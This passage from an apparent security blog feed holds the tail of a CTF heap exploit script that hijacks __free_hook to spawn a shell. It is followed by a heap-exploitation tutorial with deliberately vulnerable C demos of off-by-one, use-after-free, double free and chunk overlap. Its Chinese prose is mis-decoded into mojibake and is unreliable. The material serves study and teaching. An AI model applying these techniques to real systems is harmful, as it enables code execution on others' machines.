class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">target = libc.symbols[<span class="string">"__free_hook"</span>] + libc_base</span><br><span class="line">log.success(hex(target))</span><br><span class="line">sys_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">one_addr = libc_base + <span class="number">0x4f432</span> <span class="comment">#0x4f2c5 </span></span><br><span class="line">add(<span class="number">0x10</span>, p64(target))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(one_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åé¢å‡ ä¸ªå †é¢˜æœ‰ä¸€ä¸ªä¸Šæ¬¡æ–°ç”Ÿèµ›çš„åŸé¢˜ï¼Œä½†å°±æ˜¯åšä¸å‡ºæ¥</p>
<p>å †çš„ä¸œè¥¿è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ï¼Œæˆ‘tcl</p>
<p>é©¬ä¸Šè€ƒè¯•äº†ï¼Œå…ˆå»å¤ä¹ äº†</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>å †æ¼æ´åŠå…¶åˆ©ç”¨</title>
    <url>/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>å †åŸºç¡€å’Œå †æ¼æ´è¿˜æ˜¯åˆ†å¼€æ¯”è¾ƒå¥½</p>
<p>è¿™æ ·çœ‹ç€ä¹Ÿæ¯”è¾ƒæ•´é½</p>
<h1 id="å †æ¼æ´"><a href="#å †æ¼æ´" class="headerlink" title="å †æ¼æ´"></a>å †æ¼æ´</h1><h2 id="0x01-Off-By-One"><a href="#0x01-Off-By-One" class="headerlink" title="0x01 Off By One"></a>0x01 Off By One</h2><h3 id="1-æ¦‚å¿µ"><a href="#1-æ¦‚å¿µ" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>off-by-one æ˜¯æŒ‡å•å­—èŠ‚ç¼“å†²åŒºæº¢å‡ºï¼Œè¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å†™å…¥çš„ size æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µã€‚</p>
<h3 id="2-åˆ©ç”¨æ€è·¯"><a href="#2-åˆ©ç”¨æ€è·¯" class="headerlink" title="2.åˆ©ç”¨æ€è·¯"></a>2.åˆ©ç”¨æ€è·¯</h3><p>(1) æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚</p>
<p>(2) æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šæº¢å‡ºçš„ä¸€ä¸ªå­—èŠ‚æ°å¥½è¦†ç›–ä¸‹ä¸€å †å—çš„sizeåŸŸçš„æœ€ä½ä½ï¼Œå°†PREV_INUSEä½ç½®0ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•è¿›è¡Œå¤„ç†(åé¢å°†è¯¦ç»†ä»‹ç»)ï¼Œè¿™æ—¶ prev_size åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€  prev_size ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚</p>
<h3 id="3-æ¼”ç¤º"><a href="#3-æ¼”ç¤º" class="headerlink" title="3.æ¼”ç¤º"></a>3.æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);<span class="comment">//æ–­ç‚¹</span></span><br><span class="line">    gets(<span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">buffer</span>)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,<span class="built_in">buffer</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¿™ä¸ªç¨‹åºçš„é—®é¢˜åœ¨äºstrlen åœ¨è®¡ç®—é•¿åº¦çš„æ—¶å€™ä¸ä¼šæŠŠç»“æŸç¬¦ â€˜\x00â€™ è®¡ç®—åœ¨å†…ï¼Œä½†strcpy åœ¨æ‹·è´çš„æ—¶å€™ä¼šæŠŠ â€˜\x00â€™ ä¹Ÿç®—ä¸Šï¼Œæ‰€ä»¥å°±ä¼šé€ æˆ off by oneã€‚</p>
<p>æˆ‘ä»¬å…ˆæ¥è°ƒè¯•ä¸€ä¸‹</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219141904042.png" alt="image-20201219141904042"></p>
<p>ç›´æ¥çœ‹å †æƒ…å†µ åˆ†é…24å­—èŠ‚ä¸Šé¢ä¸ºä»€ä¹ˆå †sizeä¸º0x21ä¹Ÿå°±æ˜¯33å­—èŠ‚ è¿™ä¸ªå¯ä»¥çœ‹ä¸Šé¢çš„</p>
<p>å› ä¸ºå®ƒä¼šæŠŠä¸‹é¢ä¸€ä¸ªpre_sizeå ç”¨</p>
<p>è¾“å…¥24ä¸ªA</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219142302977.png" alt="image-20201219142302977"></p>
<p>å¯ä»¥å¾ˆç›´è§‚çš„çœ‹åˆ°ç¡®å®æ˜¯æº¢å‡ºäº†ä¸€ä¸ªå­—èŠ‚</p>
</blockquote>
<h2 id="0x02-Use-After-Free"><a href="#0x02-Use-After-Free" class="headerlink" title="0x02 Use After Free"></a>0x02 Use After Free</h2><h3 id="1-æ¦‚å¿µ-1"><a href="#1-æ¦‚å¿µ-1" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>Use After Free(UAF)å³é‡Šæ”¾åä½¿ç”¨æ¼æ´ã€‚è‹¥å †æŒ‡é’ˆåœ¨é‡Šæ”¾åæœªç½®ç©ºï¼Œå½¢æˆæ‚¬æŒ‚æŒ‡é’ˆï¼Œå½“ä¸‹æ¬¡è®¿é—®è¯¥æŒ‡é’ˆæ—¶ï¼Œä¾ç„¶èƒ½å¤Ÿè®¿é—®åŸæŒ‡é’ˆæ‰€æŒ‡å‘çš„å †å†…å®¹ï¼Œå½¢æˆæ¼æ´ã€‚</p>
<h3 id="2-åˆ©ç”¨æ¡ä»¶"><a href="#2-åˆ©ç”¨æ¡ä»¶" class="headerlink" title="2.åˆ©ç”¨æ¡ä»¶"></a>2.åˆ©ç”¨æ¡ä»¶</h3><ul>
<li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆ<strong>ç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬</strong>ã€‚</li>
<li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œ<strong>å°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</strong>ã€‚</li>
</ul>
<h3 id="3-æ¼”ç¤º-1"><a href="#3-æ¼”ç¤º-1" class="headerlink" title="3.æ¼”ç¤º"></a>3.æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*func_ptr)</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys1</span><span class="params">(<span class="keyword">char</span> command[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">(<span class="keyword">char</span> content[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));<span class="comment">//ç”³è¯·äº†4ä¸ªintå¤§å°çš„å†…å­˜</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//å› ä¸ºå‰2ä¸ªä¹Ÿå°±æ˜¯0x10æ˜¯ç”¨æ¥ç®¡ç†chunkçš„</span></span><br><span class="line">    p1[<span class="number">2</span>]=echo;<span class="comment">//æ‰€ä»¥ä»ç¬¬ä¸‰ä¸ªå¼€å§‹</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello world\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1); <span class="comment">//åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello again\n"</span>); <span class="comment">//p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨.</span></span><br><span class="line">    func_ptr *p2=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="comment">//freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€</span></span><br><span class="line">    p2[<span class="number">2</span>]=sys1; <span class="comment">//åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†sys1æŒ‡é’ˆ.</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªp1å’Œp2çš„åœ°å€æ˜¯ç›¸åŒçš„</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219145625345.png" alt="image-20201219145625345"></p>
</blockquote>
<h2 id="0x03-Double-Free"><a href="#0x03-Double-Free" class="headerlink" title="0x03 Double Free"></a>0x03 Double Free</h2><h3 id="1-æ¦‚å¿µ-2"><a href="#1-æ¦‚å¿µ-2" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>Double Freeæ˜¯UAFè¾ƒä¸ºç‰¹æ®Šçš„ä¸€ç§</p>
<h3 id="2-æ¼”ç¤º"><a href="#2-æ¼”ç¤º" class="headerlink" title="2.æ¼”ç¤º"></a>2.æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(d, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4st malloc(9) %p points to %s the first time\n"</span>, d, d);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s the second time\n"</span>, f, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160532780.png" alt="image-20201219160532780"></p>
<p>ç›´æ¥æ ¹æ®è¾“å‡ºç†è§£å…¶ä¸­çš„åŸç† ä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢ç”»çš„è¿™ä¸ªå›¾</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160630662.png" alt="image-20201219160630662"></p>
</blockquote>
<h2 id="0x04-overlap"><a href="#0x04-overlap" class="headerlink" title="0x04 overlap"></a>0x04 overlap</h2><h3 id="1-æ¦‚å¿µ-3"><a href="#1-æ¦‚å¿µ-3" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>chunk extend æ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ extend å¯ä»¥å®ç° chunk overlapping çš„æ•ˆæœã€‚</p>
<h3 id="2-åˆ©ç”¨æ¡ä»¶-1"><a href="#2-åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="2.åˆ©ç”¨æ¡ä»¶"></a>2.åˆ©ç”¨æ¡ä»¶</h3><ul>
<li>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</li>
<li>æ¼æ´å¯ä»¥æ§åˆ¶ chunk header ä¸­çš„æ•°æ®</li>
</ul>
<h3 id="3-æ¼”ç¤º1ï¼ˆfastbinï¼‰"><a href="#3-æ¼”ç¤º1ï¼ˆfastbinï¼‰" class="headerlink" title="3.æ¼”ç¤º1ï¼ˆfastbinï¼‰"></a>3.æ¼”ç¤º1ï¼ˆfastbinï¼‰</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk</span></span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//æ–·é»</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ç›´æ¥æ‰“æ–­ç‚¹</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214608484.png" alt="image-20201219214608484"></p>
<p>å¯ä»¥çœ‹åˆ°åˆ†é…äº†ä¸¤ä¸ª</p>
<p>è¿™æ—¶æˆ‘ä»¬æŠŠp1çš„sizeä½æ”¹å˜å†è¿›è¡Œé‡Šæ”¾ï¼Œå°±ä¼šè¿›å…¥fastbinä¸­</p>
<p>ç»§ç»­åˆ†é…æˆ‘ä»¬å°±å¯ä»¥æŠŠp2çš„æ•°æ®æ”¹å˜</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214801301.png" alt="image-20201219214801301"></p>
<p>fastbinå¦‚æˆ‘ä»¬æ‰€æ–™</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214832357.png" alt="image-20201219214832357"></p>
<p>æ¼”ç¤ºå®Œæˆ è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥æ”¹å˜p2çš„æ•°æ®</p>
</blockquote>
<h3 id="4-æ¼”ç¤º2ï¼ˆsmallbinï¼‰"><a href="#4-æ¼”ç¤º2ï¼ˆsmallbinï¼‰" class="headerlink" title="4.æ¼”ç¤º2ï¼ˆsmallbinï¼‰"></a>4.æ¼”ç¤º2ï¼ˆsmallbinï¼‰</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ç›´æ¥æ–­ç‚¹</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215247031.png" alt="image-20201219215247031"></p>
<p>ä¿®æ”¹sizeå€¼ä¹‹å é‡Šæ”¾ è¿›å…¥unsortedbinä¸­</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215357168.png" alt="image-20201219215357168"></p>
<p>ç»§ç»­åˆ†é…</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215517292.png" alt="image-20201219215517292"></p>
<p>æˆ‘ä»¬è¿™æ ·å°±å¯ä»¥ç›´æ¥ä¿®æ”¹æ•°æ®äº†</p>
</blockquote>
<h3 id="5-æ¼”ç¤º3ï¼ˆå‘å‰overlapï¼‰"><a href="#5-æ¼”ç¤º3ï¼ˆå‘å‰overlapï¼‰" class="headerlink" title="5.æ¼”ç¤º3ï¼ˆå‘å‰overlapï¼‰"></a>5.æ¼”ç¤º3ï¼ˆå‘å‰overlapï¼‰</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//é˜²æ­¢ä¸topåˆå¹¶</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//ä¿®æ”¹pre_inuseåŸŸ</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//ä¿®æ”¹pre_sizeåŸŸ</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlinkè¿›è¡Œå‰å‘extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//å ä½å—</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ–­ç‚¹</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219220938551.png" alt="image-20201219220938551"></p>
<p>ä¿®æ”¹æŒ‡é’ˆå</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221233429.png" alt="image-20201219221233429"></p>
<p>æ­¤æ—¶é‡Šæ”¾p4  è¿›å…¥unsortedbinä¸­ å¦‚æœè¿›è¡Œåˆ†é… é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å‘å‰overlap</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221322641.png" alt="image-20201219221322641"></p>
<p>æˆ‘ä»¬æœ€åæ¥åˆ†é…ä¸€ä¸‹</p>
<p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221445409.png" alt="image-20201219221445409"></p>
</blockquote>
<h2 id="0x05-unlink"><a href="#0x05-unlink" class="headerlink" title="0x05 unlink"></a>0x05 unlink</h2><h3 id="1-æ¦‚å¿µ-4"><a href="#1-æ¦‚å¿µ-4" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><ul>
